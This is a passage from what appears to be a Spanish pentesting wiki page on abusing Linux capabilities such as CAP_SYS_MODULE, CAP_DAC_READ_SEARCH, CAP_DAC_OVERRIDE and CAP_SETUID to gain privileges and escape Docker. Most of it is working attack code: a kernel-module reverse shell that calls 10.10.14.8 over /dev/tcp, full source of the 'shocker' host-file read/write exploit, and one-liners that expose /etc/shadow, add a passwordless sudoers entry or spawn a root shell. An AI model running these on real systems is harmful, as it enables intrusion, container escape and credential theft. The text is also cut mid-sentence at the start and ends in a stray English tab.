No podrás ver la salida del comando ejecutado, pero será ejecutado por ese proceso (así que obtén una shell inversa).

{% hint style="warning" %}
Si obtienes el error "No symbol "system" in current context." revisa el ejemplo anterior cargando un shellcode en un programa a través de gdb.
{% endhint %}

**Ejemplo con entorno (Docker breakout) - Inyección de Shellcode**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Listar **procesos** en ejecución en el **host** `ps -eaf`

1. Obtener la **arquitectura** `uname -m`
2. Encontrar un **shellcode** para la arquitectura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encontrar un **programa** para **inyectar** el **shellcode** en la memoria de un proceso ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modificar** el **shellcode** dentro del programa y **compilarlo** `gcc inject.c -o inject`
5. **Inyectarlo** y obtener tu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite al proceso cargar y descargar módulos del kernel arbitrarios (llamadas al sistema `init_module(2)`, `finit_module(2)` y `delete_module(2)`). Esto podría llevar a una escalada de privilegios trivial y compromiso de ring-0. El kernel puede ser modificado a voluntad, subvirtiendo toda la seguridad del sistema, los Módulos de Seguridad de Linux y los sistemas de contenedores.\
**Esto significa que puedes** **insertar/eliminar módulos del kernel en/del kernel de la máquina host.**

**Ejemplo con binario**

En el siguiente ejemplo, el binario **`python`** tiene esta capacidad.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Por defecto, el comando **`modprobe`** verifica la lista de dependencias y los archivos de mapa en el directorio **`/lib/modules/$(uname -r)`**.\
Para abusar de esto, creemos una carpeta falsa **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Luego **compila el módulo del kernel que puedes encontrar en los 2 ejemplos a continuación y cópialo** a esta carpeta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Finalmente, ejecuta el código Python necesario para cargar este módulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Ejemplo 2 con binario**

En el siguiente ejemplo, el binario **`kmod`** tiene esta capacidad.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Lo que significa que es posible utilizar el comando **`insmod`** para insertar un módulo del kernel. Sigue el ejemplo a continuación para obtener una **shell inversa** abusando de este privilegio.

**Ejemplo con entorno (Docker breakout)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior se puede ver que la capacidad **SYS\_MODULE** está habilitada.

**Cree** el **módulo del kernel** que va a ejecutar un shell inverso y el **Makefile** para **compilarlo**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
¡El espacio en blanco antes de cada palabra en el archivo Makefile **debe ser un tabulador, no espacios**!
{% endhint %}

Ejecute `make` para compilarlo.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicie `nc` dentro de una shell y **cargue el módulo** desde otra y capturará la shell en el proceso de nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
El código de esta técnica fue copiado del laboratorio "Abusing SYS_MODULE Capability" de [https://www.pentesteracademy.com/](https://www.pentesteracademy.com)

Otro ejemplo de esta técnica se puede encontrar en [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a un proceso **omitir los permisos de lectura de archivos y de lectura y ejecución de directorios**. Si bien esto fue diseñado para ser utilizado para buscar o leer archivos, también otorga al proceso permiso para invocar `open_by_handle_at(2)`. Cualquier proceso con la capacidad `CAP_DAC_READ_SEARCH` puede usar `open_by_handle_at(2)` para acceder a cualquier archivo, incluso archivos fuera de su espacio de nombres de montaje. El identificador pasado a `open_by_handle_at(2)` está destinado a ser un identificador opaco recuperado usando `name_to_handle_at(2)`. Sin embargo, este identificador contiene información sensible y manipulable, como números de inodo. Esto se demostró por primera vez como un problema en contenedores Docker por Sebastian Krahmer con el exploit [shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\
**Esto significa que se puede omitir la comprobación de permisos de lectura de archivos y la comprobación de permisos de lectura/ejecución de directorios.**

**Ejemplo con binario**

El binario podrá leer cualquier archivo. Por lo tanto, si un archivo como tar tiene esta capacidad, podrá leer el archivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Ejemplo con binary2**

En este caso supongamos que el binario **`python`** tiene esta capacidad. Para listar los archivos de root podrías hacer:
```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```
Y para leer un archivo podrías hacer:
```python
print(open("/etc/shadow", "r").read())
```
**Ejemplo en Entorno (Docker breakout)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior se puede ver que la capacidad **DAC\_READ\_SEARCH** está habilitada. Como resultado, el contenedor puede **depurar procesos**.

Puedes aprender cómo funciona la siguiente explotación en [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), pero en resumen, **CAP\_DAC\_READ\_SEARCH** no solo nos permite atravesar el sistema de archivos sin comprobaciones de permisos, sino que también elimina explícitamente cualquier comprobación de _**open\_by\_handle\_at(2)**_ y **podría permitir que nuestro proceso acceda a archivos sensibles abiertos por otros procesos**.

El exploit original que abusa de estos permisos para leer archivos del host se puede encontrar aquí: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), lo siguiente es una **versión modificada que te permite indicar el archivo que deseas leer como primer argumento y volcarlo en un archivo.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };
    
    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
    
    read(0, buf, 1);
    
    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");
    
    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");
    
    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);
    
    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");
    
    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");
    
    printf("Success!!\n");
    
    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);
    
    close(fd2); close(fd1);
    
    return 0;
}
```
{% hint style="warning" %}
Aprovecho las necesidades para encontrar un puntero a algo montado en el host. El exploit original usaba el archivo /.dockerinit y esta versión modificada usa /etc/hostname. Si el exploit no funciona, tal vez necesites establecer un archivo diferente. Para encontrar un archivo que esté montado en el host, simplemente ejecuta el comando mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**El código de esta técnica fue copiado del laboratorio "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro para los profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Esto significa que puedes saltarte las comprobaciones de permisos de escritura en cualquier archivo, por lo que puedes escribir cualquier archivo.**

Hay muchos archivos que puedes **sobrescribir para escalar privilegios,** [**puedes obtener ideas aquí**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con binario**

En este ejemplo, vim tiene esta capacidad, por lo que puedes modificar cualquier archivo como _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Ejemplo con binario 2**

En este ejemplo, el binario **`python`** tendrá esta capacidad. Podrías usar python para sobrescribir cualquier archivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Ejemplo con entorno + CAP\_DAC\_READ\_SEARCH (escape de Docker)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
En primer lugar, lee la sección anterior que [**abusa de la capacidad DAC\_READ\_SEARCH para leer archivos arbitrarios**](linux-capabilities.md#cap\_dac\_read\_search) del host y **compila** el exploit.\
Luego, **compila la siguiente versión del exploit shocker** que te permitirá **escribir archivos arbitrarios** dentro del sistema de archivos del host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd 

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
} 
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```
Para escapar del contenedor de Docker, podrías **descargar** los archivos `/etc/shadow` y `/etc/passwd` del host, **añadir** un **nuevo usuario**, y usar **`shocker_write`** para sobrescribirlos. Luego, **acceder** vía **ssh**.

**El código de esta técnica fue copiado del laboratorio "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Esto significa que es posible cambiar la propiedad de cualquier archivo.**

**Ejemplo con binario**

Supongamos que el binario **`python`** tiene esta capacidad, puedes **cambiar** el **propietario** del archivo **shadow**, **cambiar la contraseña de root**, y escalar privilegios:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
O con el binario **`ruby`** teniendo esta capacidad:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Esto significa que es posible cambiar los permisos de cualquier archivo.**

**Ejemplo con binarios**

Si Python tiene esta capacidad, puedes modificar los permisos del archivo shadow, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Esto significa que es posible establecer el id de usuario efectivo del proceso creado.**

**Ejemplo con binarios**

Si Python tiene esta **capacidad**, se puede abusar fácilmente de ella para escalar privilegios a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Otra forma:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Esto significa que es posible establecer el ID de grupo efectivo del proceso creado.**

Hay muchos archivos que se pueden **sobrescribir para escalar privilegios,** [**puedes obtener ideas aquí**](payloads-to-execute.md#sobrescribir-un-archivo-para-escalar-privilegios).

**Ejemplo con binarios**

En este caso, debes buscar archivos interesantes que un grupo pueda leer, ya que puedes suplantar cualquier grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una vez que hayas encontrado un archivo que puedas abusar (ya sea leyendo o escribiendo) para escalar privilegios, puedes **obtener una shell suplantando al grupo interesante** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
En este caso se suplantó al grupo shadow para poder leer el archivo `/etc/shadow`:
```bash
cat /etc/shadow
```
Si está instalado **docker**, podrías **suplantar** al **grupo docker** y abusar de él para comunicarte con el [**socket de docker** y escalar privilegios](./#writable-docker-socket).

## CAP\_SETFCAP

**Esto significa que es posible establecer capacidades en archivos y procesos**

**Ejemplo con binarios**

Si Python tiene esta **capacidad**, puedes abusar fácilmente de ella para escalar privilegios a root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```
{% endcode %} (This tag should not be translated)
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Tenga en cuenta que si establece una nueva capacidad en el binario con CAP\_SETFCAP, perderá esta capacidad.
{% endhint %}

Una vez que tenga la capacidad [SETUID](linux-capabilities.md#cap\_setuid), puede ir a su sección para ver cómo escalar privilegios.

**Ejemplo con entorno (Docker breakout)**

Por defecto, la capacidad **CAP\_SETFCAP se otorga al proceso dentro del contenedor en Docker**. Puede comprobarlo haciendo algo como:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
                                                                                                                     
apsh --decode=00000000a80425fb         
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capacidad permite **dar a los binarios cualquier otra capacidad**, por lo que podríamos pensar en **escapar** del contenedor **abusando de cualquiera de las otras vulnerabilidades de capacidad** mencionadas en esta página.\
Sin embargo, si intentas darle, por ejemplo, las capacidades CAP\_SYS\_ADMIN y CAP\_SYS\_PTRACE al binario gdb, descubrirás que puedes dárselas, pero el **binario no podrá ejecutarse después de esto**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Después de investigar, leí esto: _Permitted: este es un **subconjunto limitante para las capacidades efectivas** que el hilo puede asumir. También es un subconjunto limitante para las capacidades que pueden agregarse al conjunto heredable por un hilo que **no tiene la capacidad CAP\_SETPCAP** en su conjunto efectivo._\
Parece que las capacidades Permitidas limitan las que se pueden usar.\
Sin embargo, Docker también otorga **CAP\_SETPCAP** por defecto, por lo que es posible **establecer nuevas capacidades dentro de las heredables**.\
Sin embargo, en la documentación de esta capacidad: _CAP\_SETPCAP: \[...\] **agrega cualquier capacidad del conjunto de límites del hilo que llama a su conjunto heredable**_.\
Parece que solo podemos agregar al conjunto heredable capacidades del conjunto de límites. Lo que significa que **no podemos poner nuevas capacidades como CAP\_SYS\_ADMIN o CAP\_SYS\_PTRACE en el conjunto heredable para escalar privilegios**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proporciona una serie de operaciones sensibles, incluido el acceso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, modificar `mmap_min_addr`, acceder a las llamadas al sistema `ioperm(2)` e `iopl(2)`, y varios comandos de disco. La llamada al sistema `FIBMAP ioctl(2)` también está habilitada a través de esta capacidad, lo que ha causado problemas en el [pasado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Según la página del manual, esto también permite al titular **realizar una serie de operaciones específicas del dispositivo en otros dispositivos**.

Esto puede ser útil para **la escalada de privilegios** y **la fuga de Docker**.

## CAP\_KILL

**Esto significa que es posible matar cualquier proceso.**

**Ejemplo con binario**

Supongamos que el binario **`python`** tiene esta capacidad. Si también pudieras **modificar alguna configuración de servicio o socket** (o cualquier archivo de configuración relacionado con un servicio), podrías instalar una puerta trasera y luego matar el proceso relacionado con ese servicio y esperar a que se ejecute el nuevo archivo de configuración con tu puerta trasera.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc con kill**

Si tienes capacidades de kill y hay un **programa de nodo ejecutándose como root** (o como un usuario diferente), probablemente puedas **enviarle** la **señal SIGUSR1** y hacer que **abra el depurador de nodo** para que puedas conectarte.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con la misión de promover el conocimiento técnico, este congreso es un punto de encuentro para profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Esto significa que es posible escuchar en cualquier puerto (incluso en los privilegiados).** No se puede escalar privilegios directamente con esta capacidad.

**Ejemplo con binario**

Si **`python`** tiene esta capacidad, podrá escuchar en cualquier puerto e incluso conectarse desde él a cualquier otro puerto (algunos servicios requieren conexiones desde puertos de privilegio específicos).

{% tabs %}
{% tab title="Escuchar" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```
{% endtab %}

{% tab title="Linux Capabilities" %}
# Linux Capabilities

Linux capabilities are a way to divide the privileges of a superuser into smaller units. This way, a process can be granted only the specific capabilities it needs to perform its task, instead of having full root privileges.

## List capabilities

To list the capabilities of a process, you can use the `getpcaps` command:

```bash
$ getpcaps <pid>
```

To list the capabilities of a file, you can use the `getcap` command:

```bash
$ getcap <file>
```

## Set capabilities

To set capabilities on a file, you can use the `setcap` command:

```bash
$ setcap <capability> <file>
```

To set capabilities on a process, you can use the `setpcaps` command:

```bash
$ setpcaps <pid> <capabilities>
```

## Common capabilities

Here are some of the most common capabilities:

